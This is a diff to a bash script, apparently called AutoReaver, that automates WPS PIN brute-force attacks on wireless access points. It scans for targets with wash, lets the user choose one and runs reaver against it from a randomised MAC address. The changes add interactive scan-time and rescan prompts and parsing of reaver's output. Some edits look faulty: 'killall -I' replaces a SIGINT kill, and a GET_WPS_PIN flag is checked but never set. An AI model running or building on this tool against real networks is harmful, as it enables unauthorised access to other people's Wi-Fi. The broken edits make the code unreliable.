@@ -20,7 +20,6 @@
 ###### Airmon-ng, Aireplay-ng
 ###### Konsole
 ###### Wash
-###### Perl
 ###################################################################################################################################################
 ###### DBus Server launch ERROR issue, please visit https://www.kali.org/docs/general-use/xfce-with-rdp/
 ###################################################################################################################################################
@@ -94,7 +93,7 @@ setDeviceSettings(){
 			WIFI_CARD_PHY="${ARR_DEVICES[(WIFICHOICE*3)-3]}";
 			break;
 		else
-			echo "InValid Selection...";
+			echoRed "InValid Selection...";
 		fi
 	done
 
@@ -115,13 +114,38 @@ setDeviceSettings(){
 }
 
 setAPSettings(){
-	echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
-	echoBlue "Please Wait...";
-	echo "";
-
 	local LINE;
 	local i;
 	local APCHOICE;
+	local YN;
+	local nTIME;
+
+	while true; do
+		read -p "AP Scan Time Set to $WASH_TIME Sec., Change (Y/N)? " YN;
+
+		case $YN in
+			[Yy]* )
+				while true; do
+					read -p "Set New Scan Time [Current $WASH_TIME Sec.], (1-120): " nTIME
+
+					if [[ $nTIME -ge 1 && $nTIME -le 120 ]]; then
+						WASH_TIME=$nTIME;
+						break;
+					else
+						echoRed "Invalid Selection......";
+					fi
+				done
+				;;
+			[Nn]* )
+				break;;
+			* )
+				echoRed "Invalid Selection......";;
+		esac
+	done
+
+	echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
+	echoBlue "Please Wait...";
+	echo "";
 
 	local CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
 	eval $CMD_WASH >>/dev/null;
@@ -135,10 +159,21 @@ setAPSettings(){
 
 	if [ ${#AP_LIST[@]} -eq 2 ]; then
 		echoRed "No Targets in AP List...";
-		echoBlue "Try Increase WASH Scan Time in configurationSettings File...";
-		echoBlue "Exiting..."
-		sleep 4;
-		exitAutoReaver;
+		echoBlue "Try Increase WASH Scan Time...";
+
+		while true; do
+			read -p "ReScan APs (Y/N)? " YN;
+
+			case $YN in
+				[Yy]* )
+					setAPSettings;;
+				[Nn]* )
+					echoBlue "Exiting..."
+					exitAutoReaver;;
+				* )
+					echoRed "Invalid Selection......";;
+			esac
+		done
 	fi
 
 	for (( i=0; i<${#AP_LIST[@]}; i++ )); do
@@ -155,25 +190,31 @@ setAPSettings(){
 	echo "";
 
 	while true; do
-		read -p "Choose AP (1-$((${#AP_LIST[@]}-2))) 0 to All): " APCHOICE;
+		read -p "Choose AP (1-$((${#AP_LIST[@]}-2))), (0) to All, (R)escan : " APCHOICE;
 
-		if [[ $APCHOICEe -le $((${#AP_LIST[@]}-2)) && $APCHOICE -ge 1 ]]; then
-			APCHOICE=$((APCHOICE+1))
-			AP_BSSID=$(awk '{ print $1 }' <<< "${AP_LIST[$APCHOICE]}");
-			AP_CHANNEL=$(awk '{ print $2 }' <<< "${AP_LIST[$APCHOICE]}");
-			AP_ESSID=$(awk '{ print $7 }' <<< "${AP_LIST[$APCHOICE]}");
-			AP_WPS=$(awk '{ print $4 }' <<< "${AP_LIST[$APCHOICE]}");
-			AP_LOCK=$(awk '{ print $5 }' <<< "${AP_LIST[$APCHOICE]}");
-			unset AP_LIST;
+		if [[ $APCHOICE -le ${#AP_LIST[@]}-2 && $APCHOICE -gt 0 ]]; then
+			AP_BSSID=$(awk '{ print $1 }' <<< "${AP_LIST[$APCHOICE+1]}");
+			AP_CHANNEL=$(awk '{ print $2 }' <<< "${AP_LIST[$APCHOICE+1]}");
+			AP_ESSID=$(awk '{ print $7 }' <<< "${AP_LIST[$APCHOICE+1]}");
+			AP_WPS=$(awk '{ print $4 }' <<< "${AP_LIST[$APCHOICE+1]}");
+			AP_LOCK=$(awk '{ print $5 }' <<< "${AP_LIST[$APCHOICE+1]}");
 			break;
 		else
-			if [ $APCHOICE -eq 0 ]; then
+			if [[ "$APCHOICE" == "0" ]]; then
 				###### All option will allow this script to loop the wash output result
 				###### Under development......
-				echoRed "All... is Currently Unavailable. Please Select Single Target."
+				echoRed "All... is Currently Unavailable. Please Select Single Target.";
+			elif [[ "$APCHOICE" == "r" || "$APCHOICE" == "R" ]]; then
+				clear;
+				setAPSettings;
+				break;
+			else
+				echoRed "Invalid Selection......";
 			fi
 		fi
 	done
+
+	unset AP_LIST;
 }
 
 setReaverOpt(){
@@ -546,23 +587,29 @@ while true; do
 #	echo "$CMD_FAUTH" && eval $CMD_FAUTH >>/dev/null
 
 	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
-	echoWhite "$CMD_REAVER" && eval $CMD_REAVER | {
-		while IFS= read -r REAVER_OUTPUT; do
+	eval $CMD_REAVER | {
+		while read -r REAVER_OUTPUT; do
 			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "ap rate limiting") != 0 ]]; then
 				echoRed "$REAVER_OUTPUT";
-				echoRed "AP Rate Limiting Detected!!! Exiting......";
-				AP_RATE_LIMITING=1;
-				$(killall -INT reaver);
-				$(exit);
+				echoRed "[!] AP Rate Limiting Detected!!! Exiting......";
+				GET_RATE_LIMITING=1;
+				$(killall -I reaver);
+			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps pin") != 0 ]]; then
+				echoRed "$REAVER_OUTPUT";
+				echoRed "WPS PIN Found......";
+				$(killall -I reaver);
+			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "[!]") != 0 || $(echo "$REAVER_OUTPUT" | grep -ic "[-]") != 0 ]]; then
+				echoRed "$REAVER_OUTPUT";
+			else
+				echoBlue "$REAVER_OUTPUT";
 			fi
-#			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "ap rate limiting") != 0 ]]; then
-#				echoRed "$REAVER_OUTPUT";
-#				echoRed "AP Rate Limiting Detected!!! Exiting......";
-#				AP_RATE_LIMITING=1;
-#				$(killall -INT reaver);
-#			fi
 		done
 	}
+
+	if [[ $GET_RATE_LIMITING == 1 || $GET_WPS_PIN == 1 ]]; then
+		echo "AP Rate Limiting or WPS PIN Found......";
+		break;
+	fi
 
 	stopMonitor;
 	resetDeviceDriver;
